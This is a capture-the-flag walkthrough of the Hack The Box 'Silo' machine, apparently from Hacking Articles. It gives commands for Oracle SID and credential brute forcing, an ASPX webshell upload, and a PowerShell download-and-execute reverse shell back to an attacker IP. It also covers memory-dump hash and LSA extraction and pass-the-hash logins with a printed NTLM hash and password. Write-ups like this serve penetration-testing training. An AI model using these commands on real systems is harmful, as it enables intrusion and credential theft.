@@ -1,0 +1,159 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the Box: Silo Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-silo-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-08-06T09:08:39+00:00">August 6, 2018</time><time class="updated" datetime="2025-07-05T16:07:31+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Silo is a windows machine and is considered a Medium by Hack the Box. This machine is vulnerable to an oracle database where we are going to use various techniques to get our foothold into the box. This box is a good resource and example to understand the oracle database vulnerability and how to perform assessment against the target system. Additionally, we will be exploring tools and techniques to tackle this kind of database vulnerability from the enumeration to the exploitation phase. Also, we will see how computer networking technologies work with the database to make the peer-to-peer connection. In the lateral phase, we will exploit Dropbox dumped memory and analyse using popular memory analysing tool called Volatility and use pass the hash technique to login as administrator remotely.</span></p>
+<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Port scan</span></li>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Oracle Database TNS SID Brute force</span></li>
+<li><span style="color: #000000;">Credentials Bruteforce</span></li>
+<li><span style="color: #000000;">Database Library Enumeration</span></li>
+<li><span style="color: #000000;">Web shell upload</span></li>
+<li><span style="color: #000000;">Web shell to reverse shell</span></li>
+<li><span style="color: #000000;">User flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Dropbox Memory Dump</span></li>
+<li><span style="color: #000000;">Hash dump with Volatility</span></li>
+<li><span style="color: #000000;">Root flag</span></li>
+<li><span style="color: #000000;">Pass the Hash (Login-Method 1)</span></li>
+<li><span style="color: #000000;">Lsa dump with Volatility</span></li>
+<li><span style="color: #000000;">Winexe –Plain text password (Login-Method 2)</span></li>
+<li><span style="color: #000000;">Evil-winrm-Pass the Hash (Login Method -3)</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
+<h3><span style="color: #800000;"><strong>Initial Access</strong></span></h3>
+<p><span style="color: #000000;">We are going to start the assessment with port scanning.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Port Scan</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open so we can begin our port and service analyse. Nmap is a popular port scanning tool come with Kali Linux. In order to perform port scan, we have used <strong>-sC</strong> and <strong>-sV</strong> flags.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sC</strong>: Scans with default NSE scripts</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>:  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;">Command used:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.95.188</pre>
+<p><span style="color: #000000;">From the nmap scan, we have found there were so many ports open which is used for the RPC Client-server communication port 80 is running the http service and 1521 is running <strong>oracle-tns</strong> service. Out of these all ports <strong>1521</strong> port looks interesting. So let’s begin with the port 1521 enumeration.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj70zf-t5kQW0gCktOVhDxqmLM6KxsalPX_K9b81R6ixchhM9dIbUxhbpyOzK-mEuCTSBt_d7c5dsOeRbOomaA1EIJu9IO6N6iv4SFV9aALXCx9aR43r2K8ZEisH10HilbzZwpKRmetm2i69zvra_nFwV7X27ADJp-2xXbHWxKDURFsgtB75STY9VIORw/s16000/1.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s find out what <strong>Oracle</strong> Database is. Oracle is a Relational Database Management System and the Transparent Network Substrate which is also known as <strong>TNS</strong> is a proprietary Oracle Computer networking technology which supports end-to-end connectivity on top of other networking technologies like TCP/IP, SDP and named pipes. It is used to make a connection with the Oracle databases. Furthermore, TNS listener is a separate process that runs on the database server, and it receives the client’s incoming connection requests and forward the traffic to the database server accordingly. In order to do the assessment, we will require to have a tool name <strong>odat</strong> installed in our Kali machine. So, let’s install it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install odat</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTIXNoFpyH54POX-gGKf8yM9NMsS_Dz3Es-VhCdHWhYYpZqzbt0CnrJ8VnOz7FW7xzsV3HLtd1RTHWEa4MRTt1slvlGs2mrdl2VuasrKBN6tziDKDTmEwBfrffmdAuqWRd-PFVFm9wnrzQBdRyP234ZdBwui2FLsljuRzibiXuOtGFC_Nhs-jZcwGNOA/s16000/3.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Oracle Database TNS SID Brute force</strong></span></span></h4>
+<p><span style="color: #000000;">We can consider it as Man in The Middle attack as Oracle database is using a networking technology called oracle TNS to forward the request to the real database server. In order to exploit this vulnerability of the database we need to begin with the <strong>SID brute force.</strong> We are going to use odat to bruteforce its SID then we will assemble each part accordingly. Below command will guess the SID of the Target and keep continue until it gets a valid SID.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">odat sidguesser -s 10.129.95.188</pre>
+<p><span style="color: #000000;">Here we have found valid SIDS which is<strong> XE </strong>and <strong>XEXDB. </strong>Once we found valid SIDs then we will switch to the Metasploit framework and use Msfconsole for the further exploit process.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgst-WeiZTNpgsHFS8O37cqOPakUf19dwlHjBemAcq5zrn0xL6U8sH1MHZoPhDgJSuHDcz7i3n_LV3fkbDchwPwDGtajriUubZEP_kx1Ekln7uWgTaGewEAZ06icZ5U7yLibJ93_mDXO4csYXW-ef4u-WesNRb0s8Co5WMJ4Kcn_1DhMU_9IOZ-nxI6hg/s16000/4.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Credentials Bruteforce</strong></span></span></h4>
+<p><span style="color: #000000;"> The next step of the exploit process is to find valid credentials. Let’s start <strong>msfconsole</strong> in our kali terminal<strong>. </strong>Metasploit msfconsole is very easy to use, here we need to select our exploit module and then provide the following information such as rhost (remote host) which is the target IP address, Database SID and simple run exploit command and the exploit will execute against the target and give us valid credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/oracle/oracle_login
+set rhost 10.129.95.188
+set SID XE
+exploit</pre>
+<p><span style="color: #000000;">From the above exploit, we have successfully found valid credentials. Now we have username: <strong>scott</strong> and password: <strong>tiger</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDd3MF4eJbdBOHdJ6tJlB0b2-n3WAn8ujAyWyJiXUeG9Tg2YShVrVZXBn-JVjVQYNpIjZXFjm4FhbQZLxzu42ZvdS8pspmKXAkxu409ZVid3HHzQ4h_ocYF-mWX6hffkrVTXBdsQ4qNMCf6Ti_iYhmrL81AnM5Pib4qWPAmCcLSwkJxHGSmmqwAeKreg/s16000/5.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong><span style="color: #000000; text-decoration: underline;">Database Library Enumeration</span> </strong></span></span></h4>
+<p><span style="color: #000000;">Odat is a very useful tools that come with various features here we are not getting way, so we are using</span></p>
+<p><span style="color: #000000;"><strong>-all</strong> flag to gather more information about the database with valid credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">odat all -s 10.129.95.188 -d XE -U scott -P tiger --sysdba</pre>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-all</strong>  : All options</span></p>
+<p><span style="color: #000000;"><strong>-s</strong>   :  Target IP</span></p>
+<p><span style="color: #000000;"><strong>-d</strong> : Database  </span></p>
+<p><span style="color: #000000;"><strong>-U  </strong>: Username</span></p>
+<p><span style="color: #000000;"><strong>-P  </strong>: Password  </span></p>
+<p><span style="color: #000000;"><strong>–sysdba   </strong>: check sysdba privilege status</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguExaZQiOu9XYswLUIpEUdC239TmNGgjoMPM582TIer6f-RhC4swpi0xsxJTAMOkN-9ByDhbo0CenwgnyDq2f-bol9ZHB_eV4ziU22U5cyElciRkC7-yFg2So-WaBwXO7VOEOrLpNH7F_MlOsXWV6ro0SAOTT-9EWk3En0v68Gio2FWbjnG_itzhZO-g/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">If we take a closer look at the screenshot above, we can see that the <strong>DBMS_XSLPROCESSOR</strong> library is enable which allows a remote user to upload file. From here, we can now think about uploading any malicious file which could lead us to a reverse shell.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">Web Shell Upload</span></span></h4>
+<p><span style="color: #000000;">Let’s upload a command shell into the target <strong>wwwroot</strong> directory. Command shell comes with Kali and is available in the <strong>/usr/share/webshells/aspx/</strong> directory as <strong>cmdasp.aspx</strong>. The reason we chose the wwwroot directory is that port 80 is open and uploaded file can be accessible over browser. We need to provide the following information to the database to upload a command shell, such as the database library name, the upload directory in the target system, the directory where the command shell file is stored, the database name, the username, and the password, etc. For a better understanding, we list the commands breakdown below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">odat dbmsxslprocessor -s 10.129.95.188 -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot\\" shell.aspx /usr/share/webshells/aspx/cmdasp.aspx --sysdba</pre>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-putFile</strong>  : upload file</span></p>
+<p><span style="color: #000000;"><strong>-s</strong>   :  Target IP</span></p>
+<p><span style="color: #000000;"><strong>-d</strong> : Database  </span></p>
+<p><span style="color: #000000;"><strong>-U  </strong>: Username</span></p>
+<p><span style="color: #000000;"><strong>-P  </strong>: Password  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjPJFz62tZnKOrhISrrXZeThF6Wchxk9R5UlVxoxX84hkVL1peTaHAjouM1Nd8sQt-Y33DvtTl14MGrIetBvfrlrHpB6NSzli5O7dzcMHTuTlJi5QGN_uKSh99JMZsnqwYHSLqFiQXR5TPHgaMbaQAq_xzslwrpg8XMmHA-f4phnrdGI7UINLIQsOcBw/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Once we upload the file then we can access the web shell via browser. Please note we have uploaded our <strong>cmdasp.aspx</strong> shell and saved it as a shell.aspx in the target web root directory. The url of can be found below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.95.188/shell.aspx.</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisjk13b_gL3Ki84QeWv6L7V-zvnkLUv_l2g9m0IXNR7SIIF6dHw387kNOuZTVZLJe0dIKynN0h1R5wBzE5sh6weyBACZGqbjzWRAz6PqU1Dj8rPMJNjyMux07PgfqzT4IwGV7WsaxLQT1ZXEEhIgU_OuyvLfg8D4jtHnuNm_EXmZyCCxJstvEV51HNKQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">We have got a web shell over the browser now we can execute system commands here. We can verify the user with <strong>whoami </strong>command. From the output, we have received an <strong>IIS service account</strong> shell.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Web shell to reverse shell</strong></span></span></h4>
+<p><span style="color: #000000;">We are going to upgrade our shell using nishang powershell script which can be download from here: </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</pre>
+<p><span style="color: #000000;">Once we download <strong>Invoke_PowershellTcp.ps1 </strong>then we need to make some minor changes in order to receive a reverse connection from the target machine. Open <strong>Invoke_PowershellTcp.ps1 </strong>in any text editor like leafpad, vi, nano, gedit, mousepad etc and add the below line at the last line of the script and save it. In the <strong>added line</strong> we have adding listening host Ip address and listening port number.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.35 -Port 4444</pre>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</pre>
+<p><span style="color: #000000;">Also, we will set up a python server on port 80 so we can download this shell to the target system.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjB_QEZQMGpAYVSAvUSVvjYmqcl7UPv6PuGPP-h31oVSSwDu31KAW109Ps3EDpLIFXPWTOFq0tXydpAQ--YLqJzEGdZHbHnc0sRy91JjjaSLUYkRyFfL3jJUYGn_O_uYglD4YNlyEhhQB35QhroMo1VPzxKrx4pWwtuHp72d52QLlJjJxAjFI_01jGVig/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Once the python server is set, we can download and directly execute our powershell reverse shell from the web shell. Just go to the web shell and give the below command in the input field.  Make sure the netcat listener is on in the Kali machine on port 4444.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444</pre>
+<p><span style="color: #000000;"><strong>On the web shell user input Field:</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.35:80/Invoke-PowerShellTcp.ps1')</pre>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>User Flag</strong></span></span></h4>
+<p><span style="color: #000000;">If we check your netcat listener, we will see that we have received a reverse shell. While enumerating users we found there is a user named<strong> Phineas</strong>. We can grab our user flag from the Phineas desktop directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\\users
+ls
+cd Phineas\Desktop
+ls
+cat user.txt</pre>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">As we have got our user flag now it’s time to look around privilege escalation vectors and clues. We noticed, here is another text file there named <strong>oracle issue.txt</strong>. When we opened the file, we found a dropbox link and the password (<strong>?%Hm8646uC$ </strong>)which can be useful for our further assessment. It looks like quite promising credentials for dropbox.</span></p>
+<p><span style="color: #000000;">Password found: <strong>?%Hm8646uC$</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat "Oracle issue.txt"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEie0bLxeW9BhPFkXyBSBhKSdUTRtvntRNu-DoOMEilShN87bQoLoRXR-30xnJmL-5DMgNPD9e7inIx-wXv_-xcXB-00rujbAKdUET7mukr5BmqYSPs_KTLfdVPsollgO3t0BV0y4O_i5RUScqjhpZD7NcUlz9tExUVtQB5u3VCalLuSl_AvDcBMpa8c4w/s16000/13.png"/></span></p>
+<p><span style="color: #000000;"><strong>What is a drop box and what it is used for?</strong></span></p>
+<p><span style="color: #000000;">It is an application run on Linux, Windows and Mac Operating systems. It also supports IOS, Android and Windows mobile devices. With this application, you can store, share, transfer and download files using browsers.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Dropbox Memory Dump</strong></span></span></h4>
+<p><span style="color: #000000;">We opened the dropbox link we found from that text file and given password which we found from the same text file. As expected we are now authenticated to dropbox.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMvKiWaoBfgTSR_JQ_bCy1zcxT2W-HvJiTLj9B1Sh8tit_pDe1_53StJVMqKJWYoJgb07mpKOhtOnfjd3Qh6LMUXQDU72TrG9DSOe1DA5FIkuPPWH8HTdwDHJ-yAs5yZlwOw5xY-t8Tox5D-2uQl5LMD7CjZzuILKJZ7hszCViGvreSWfGg3QZjB_ESQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">After authenticating, we dumped the memory and found a zip file present in the drop box. The zip file is : <strong>SILO-20180105-221806.</strong><strong>zip.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgedvEh86fT4r0wfb-z94pNFhe8hNadqAJR4UvDQ0i8RkfZK294s9FvaqDvZ0zRp8oj4xNjj0NWEYv434imY_0Av5AEclEtkHJdmOfHOBZ69ZbFM1qe4XydoAODurlzVR4UjrkuYF-6qBspCi5jLZBSPWhmJNJPjf8SDmn-iwM7Zs1d28YKPUIpjh5j2w/s16000/15.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Hash dump with Volatility</strong></span></span></h4>
+<p><span style="color: #000000;">We have dumped the memory of the dropbox, and a zip file is created. Transfer the zip file to the Attacker machine for further analysis. We simply, unzipped the file and a new dump file is created in the same directory. New dump file: <strong>SILO-20180105-221806.dmp.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">unzip SILO-20180105-221806.zip</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpspORTCGZC9QYajcPiFu5CODevO0S5ubHMZT061PeGqVikIPAqHocJRrNufDCKbGX97ey7MLtAeMlxdc4uegAu6P_x9qTpk_mhqKgBKHAeto2EEF897AP1mNSKtNOs-JMuGU4IbCOkVkJbMMXyE_Ciubu8yyK3wBymrMwu-QOA0NV0pokliV47gNN2w/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Now we are going to use a popular tool to analyse the dump file and extract some juicy information from it. Before jumping directly into the tool, let’s talk about <strong>Volatility</strong>.</span></p>
+<p><span style="color: #000000;"><strong>What is Volatility and what it is used for?</strong></span></p>
+<p><span style="color: #000000;">The blue team widely uses Volatility, an open-sourced memory forensic tool, for incident response, malware analysis, and memory analysis.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Root Flag</strong></span></span></h4>
+<p><span style="color: #000000;">This tool can be helpful to analyse Vmware dumps, Virtual box dumps, crash dumps, memory dumps, raw dumps etc. Sounds interesting, as we need something like this to analyse our dumped data. Let’s dump the hash from the memory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./volatility -f SILO-20180105-221806.dmp –profile=Win2012R2x64 hashdump</pre>
+<p><span style="color: #000000;">We have successfully dumped the hash of the users. Now we can use <strong>pass the hash</strong> technique to login as administrator. With this technique, we do not require to crack any hash and we can use the hash as a password of the user. As we have obtained the hash, we can login now.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjIYl680yqOOCmBCpKSnX7lgnosbEIelYUBbQlmy_7MbqviyJtSmODxCJNJ-6G6bfErG5lGQL3qUHGlaO0m2HK4VshykxkOJucQdul1XV_ImggPuy8jdAmGpHRtUQieRA748axxGjAB9ELxl9dndNjn9KhvlcgMBSATIMCp6pQNtYMQwxzHS06_OCVYNw/s16000/17.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Pass the Hash (Login-Method 1)</strong></span></span></h4>
+<p><span style="color: #000000;">Here we have logged in as administrator by using the technique called Pass the hash. Now we can grab our root flag from the</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.129.95.188 cmd.exe
+
+cd C:\Users\Administrator\Desktop</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnt34CqJL-SUQMIKVISkV36RDL8TY2KYFgj4eEqfNjOBVMItjBKdd7Bq-RD2iiftOeEXOerLTRI4h5S2KlGq43tfuparo379ASq8r4T_cRtxWMDJPHlQbLckTCyXG-k7YXhgQD5fsreou0dZilTaiKC8Ahtm9l3RY8ZDxguG5P0WZS0flAQrHkH82jHA/s16000/18.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Lsa dump with Volatility</strong></span></span></h4>
+<p><span style="color: #000000;">In the above example, we simply dumped the hash and logged in as administrator. We can also check for the plain text password in the lsa. Volatility is a very powerful tool which can also extract the lsa data from the dump file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./volatility -f SILO-20180105-221806.dmp –profile=Win2012R2x64 lsadump</pre>
+<p><span style="color: #000000;">It has dumped some ASCII data with dot-separated, let’s assemble it.</span></p>
+<p><span style="color: #000000;"><strong>DoNotH@ckMeBro!</strong></span></p>
+<p><span style="color: #000000;">It looks like a plain text password of the user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyvf6VBIpeeVWR88EZxbKT3Ait50AkfQnBAFDaNHTHCK_60ZFBcCwh0KscWb2kRDD9LsGlbc64kWDPQDrsL52azhQ-L2Two7mwdV1cBU02Gk8SscYZectR57BmxNLUyR_PHy2hA7H8Bh99u6UhQViAAQ_fuS28Dd4lhyBUFwUi1Tw9GwWkqMeKG6O0BA/s16000/24.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Winexe –Plain text password (Login-Method 2)</strong></span></span></h4>
+<p><span style="color: #000000;">We have found a Plain text password from the lsa dumped memory. Let’s check if it works with the administrator and as expected it worked and again we successfully logged in.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">winexe -U Administrator //10.129.95.188 cmd.exe</pre>
+<h3><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihbuNxatvCD6_gcX2JNcY07wOjni1cgycg4f0m_BDE4FsP3SyaRNVopsLXVqmJIyvKLtp9ajAZlPoOxg2st3s9g9Kj8f6k1SginXc0GLh0d1zGDL3_nsrs2OQsD3LA3lWGVcgZB5KflvYcjEBIzN1YezZ7K1ispscqJZrM9I22W-7BPdtmtVtjCE8xHQ/s16000/25.png"/></strong></span></h3>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Evil-winrm-Pass the Hash (Login Method -3)</strong></span></span></h4>
+<p><span style="color: #000000;">We can also login with <strong>Evil-winrm</strong> which comes with Kali Linux. Here we are going to use pass the hash technique, but we can also use plain text as well. Evil-winrm tool will only work if port <strong>5985</strong> is open in the target machine. Let’s pass the hash to get logged in as the administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.95.188 -u Administrator -H 9e730375b7cbcebf74ae46481e07b0c7</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnL4wN8igg5InLOAduCcb2DnLSJDj7Cdpj9xfA7PylZ816zIhSPR9X866EZ-VkftzmYN0eLOjwI8Sy4btbNrWkRHz9ZTp-K-IpneYSNgJ5gIMHL2lq0WzVMoUhoDNNzFTsM-PatPluSPNwj41xtwbs9CH0VANueX3NtNz7Qa4FDUVLCFjioFypkJXSkQ/s16000/35.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
+<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as port scanning, service enumeration, Database enumeration, Credential bruteforce, networking used in the database server, converting web shell to reverse shell, memory dump, dumped memory analysis, hash dump, lsa memory dump and various techniques to log in to the target machine such as pass the hash and with plain text password.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and love to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact her</span>e<strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a></span></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
